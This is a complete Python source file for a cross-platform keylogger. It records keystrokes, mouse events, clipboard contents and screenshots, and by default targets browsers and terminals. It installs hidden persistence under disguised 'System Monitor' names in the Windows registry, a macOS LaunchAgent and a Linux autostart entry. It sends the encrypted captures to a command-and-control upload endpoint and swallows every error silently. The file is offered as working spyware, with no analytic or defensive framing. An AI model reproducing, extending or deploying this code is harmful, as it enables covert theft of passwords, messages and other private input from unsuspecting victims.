import os
import sys
import time
import json
import threading
import socket
import base64
import platform
import subprocess
from datetime import datetime
from pathlib import Path
from typing import Dict, List, Optional
from pynput import keyboard, mouse
from cryptography.fernet import Fernet
import requests

class KeyloggerCore:
    def __init__(self, config: Dict):
        self.config = config
        self.running = False
        self.buffer = []
        self.lock = threading.Lock()
        self.session_id = self._gen_session_id()
        self.encryption_key = config.get('encryption_key') or Fernet.generate_key()
        self.cipher = Fernet(self.encryption_key)
        self.c2_url = config.get('c2_url', 'http://localhost:8080')
        self.flush_interval = config.get('flush_interval', 30)
        self.max_buffer = config.get('max_buffer', 1000)
        self.capture_mouse = config.get('capture_mouse', True)
        self.capture_clipboard = config.get('capture_clipboard', True)
        self.capture_screenshots = config.get('capture_screenshots', False)
        self.screenshot_interval = config.get('screenshot_interval', 60)
        self.target_apps = config.get('target_apps', [])
        self.exclude_apps = config.get('exclude_apps', [])
        self._setup_persistence()
        self._start_flush_thread()
        if self.capture_screenshots:
            self._start_screenshot_thread()

    def _gen_session_id(self) -> str:
        hostname = socket.gethostname()
        user = os.getenv('USER') or os.getenv('USERNAME') or 'unknown'
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        return f"{hostname}_{user}_{timestamp}"

    def _setup_persistence(self):
        if sys.platform == 'win32':
            self._win_persistence()
        elif sys.platform == 'darwin':
            self._mac_persistence()
        else:
            self._linux_persistence()

    def _win_persistence(self):
        try:
            import winreg
            key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
            with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE) as key:
                exe_path = sys.executable if getattr(sys, 'frozen', False) else os.path.abspath(__file__)
                winreg.SetValueEx(key, "SystemMonitor", 0, winreg.REG_SZ, f'"{exe_path}" --silent')
        except Exception:
            pass

    def _mac_persistence(self):
        try:
            plist_dir = Path.home() / "Library/LaunchAgents"
            plist_dir.mkdir(exist_ok=True)
            plist_path = plist_dir / "com.system.monitor.plist"
            exe_path = sys.executable if getattr(sys, 'frozen', False) else os.path.abspath(__file__)
            plist_content = f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key><string>com.system.monitor</string>
    <key>ProgramArguments</key><array><string>{exe_path}</string><string>--silent</string></array>
    <key>RunAtLoad</key><true/>
    <key>KeepAlive</key><true/>
</dict></plist>"""
            plist_path.write_text(plist_content)
            subprocess.run(['launchctl', 'load', str(plist_path)], capture_output=True)
        except Exception:
            pass

    def _linux_persistence(self):
        try:
            autostart_dir = Path.home() / ".config/autostart"
            autostart_dir.mkdir(parents=True, exist_ok=True)
            desktop_path = autostart_dir / "system-monitor.desktop"
            exe_path = sys.executable if getattr(sys, 'frozen', False) else os.path.abspath(__file__)
            desktop_content = f"""[Desktop Entry]
Type=Application
Name=System Monitor
Exec={exe_path} --silent
Hidden=false
NoDisplay=true
X-GNOME-Autostart-enabled=true"""
            desktop_path.write_text(desktop_content)
            os.chmod(desktop_path, 0o755)
        except Exception:
            pass

    def _start_flush_thread(self):
        self.flush_thread = threading.Thread(target=self._flush_loop, daemon=True)
        self.flush_thread.start()

    def _start_screenshot_thread(self):
        self.screenshot_thread = threading.Thread(target=self._screenshot_loop, daemon=True)
        self.screenshot_thread.start()

    def _screenshot_loop(self):
        try:
            import mss
            with mss.mss() as sct:
                while self.running:
                    time.sleep(self.screenshot_interval)
                    if not self.running:
                        break
                    try:
                        monitor = sct.monitors[1]
                        screenshot = sct.grab(monitor)
                        img_bytes = mss.tools.to_png(screenshot.rgb, screenshot.size)
                        encoded = base64.b64encode(img_bytes).decode()
                        self._log_event('screenshot', {'data': encoded, 'timestamp': datetime.now().isoformat()})
                    except Exception:
                        pass
        except ImportError:
            pass

    def _flush_loop(self):
        while self.running:
            time.sleep(self.flush_interval)
            self.flush()

    def _get_active_window(self) -> str:
        try:
            if sys.platform == 'win32':
                import win32gui
                hwnd = win32gui.GetForegroundWindow()
                return win32gui.GetWindowText(hwnd) or "Unknown"
            elif sys.platform == 'darwin':
                script = 'tell application "System Events" to get name of first application process whose frontmost is true'
                result = subprocess.run(['osascript', '-e', script], capture_output=True, text=True)
                return result.stdout.strip() or "Unknown"
            else:
                result = subprocess.run(['xdotool', 'getactivewindow', 'getwindowname'], capture_output=True, text=True)
                return result.stdout.strip() or "Unknown"
        except Exception:
            return "Unknown"

    def _should_capture(self, window_title: str) -> bool:
        if self.target_apps:
            return any(app.lower() in window_title.lower() for app in self.target_apps)
        if self.exclude_apps:
            return not any(app.lower() in window_title.lower() for app in self.exclude_apps)
        return True

    def _log_event(self, event_type: str, data: Dict):
        with self.lock:
            event = {
                'session_id': self.session_id,
                'timestamp': datetime.now().isoformat(),
                'type': event_type,
                'window': self._get_active_window(),
                'data': data
            }
            self.buffer.append(event)
            if len(self.buffer) >= self.max_buffer:
                self.flush()

    def on_press(self, key):
        if not self.running:
            return False
        window = self._get_active_window()
        if not self._should_capture(window):
            return
        try:
            char = key.char
        except AttributeError:
            char = f"[{key.name}]"
        self._log_event('keystroke', {'key': char, 'window': window})

    def on_release(self, key):
        pass

    def on_click(self, x, y, button, pressed):
        if not self.running or not self.capture_mouse:
            return
        if pressed:
            self._log_event('mouse_click', {'x': x, 'y': y, 'button': str(button)})

    def on_scroll(self, x, y, dx, dy):
        if not self.running or not self.capture_mouse:
            return
        self._log_event('mouse_scroll', {'x': x, 'y': y, 'dx': dx, 'dy': dy})

    def _capture_clipboard(self):
        try:
            if sys.platform == 'win32':
                import win32clipboard
                win32clipboard.OpenClipboard()
                data = win32clipboard.GetClipboardData()
                win32clipboard.CloseClipboard()
                return data
            elif sys.platform == 'darwin':
                result = subprocess.run(['pbpaste'], capture_output=True, text=True)
                return result.stdout
            else:
                result = subprocess.run(['xclip', '-o', '-selection', 'clipboard'], capture_output=True, text=True)
                return result.stdout
        except Exception:
            return None

    def _clipboard_loop(self):
        last_content = ""
        while self.running:
            time.sleep(2)
            if not self.capture_clipboard:
                continue
            content = self._capture_clipboard()
            if content and content != last_content and len(content) > 0:
                last_content = content
                self._log_event('clipboard', {'content': content[:5000]})

    def start(self):
        self.running = True
        self.keyboard_listener = keyboard.Listener(on_press=self.on_press, on_release=self.on_release)
        self.mouse_listener = mouse.Listener(on_click=self.on_click, on_scroll=self.on_scroll)
        self.keyboard_listener.start()
        self.mouse_listener.start()
        if self.capture_clipboard:
            self.clipboard_thread = threading.Thread(target=self._clipboard_loop, daemon=True)
            self.clipboard_thread.start()
        self._log_event('session_start', {'platform': platform.platform(), 'python': platform.python_version()})

    def stop(self):
        self.running = False
        self._log_event('session_end', {})
        if hasattr(self, 'keyboard_listener'):
            self.keyboard_listener.stop()
        if hasattr(self, 'mouse_listener'):
            self.mouse_listener.stop()
        self.flush()

    def flush(self):
        with self.lock:
            if not self.buffer:
                return
            payload = {
                'session_id': self.session_id,
                'events': self.buffer.copy(),
                'count': len(self.buffer)
            }
            self.buffer.clear()
        self._send_to_c2(payload)

    def _send_to_c2(self, payload: Dict):
        try:
            encrypted = self.cipher.encrypt(json.dumps(payload).encode())
            data = {'session_id': self.session_id, 'payload': base64.b64encode(encrypted).decode()}
            requests.post(f"{self.c2_url}/api/keylogger/upload", json=data, timeout=10)
        except Exception:
            self._save_local(payload)

    def _save_local(self, payload: Dict):
        try:
            log_dir = Path.home() / ".system_logs"
            log_dir.mkdir(exist_ok=True)
            log_file = log_dir / f"{self.session_id}.log"
            with open(log_file, 'a') as f:
                f.write(json.dumps(payload) + '\n')
        except Exception:
            pass

def create_keylogger(config: Dict) -> KeyloggerCore:
    return KeyloggerCore(config)

if __name__ == '__main__':
    import argparse
    parser = argparse.ArgumentParser()
    parser.add_argument('--silent', action='store_true')
    parser.add_argument('--c2', default='http://localhost:8080')
    parser.add_argument('--interval', type=int, default=30)
    args = parser.parse_args()

    config = {
        'c2_url': args.c2,
        'flush_interval': args.interval,
        'encryption_key': os.getenv('KLG_KEY'),
        'capture_mouse': True,
        'capture_clipboard': True,
        'capture_screenshots': False,
        'target_apps': ['chrome', 'firefox', 'edge', 'safari', 'terminal', 'cmd', 'powershell'],
        'exclude_apps': []
    }

    klg = create_keylogger(config)
    klg.start()
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        klg.stop()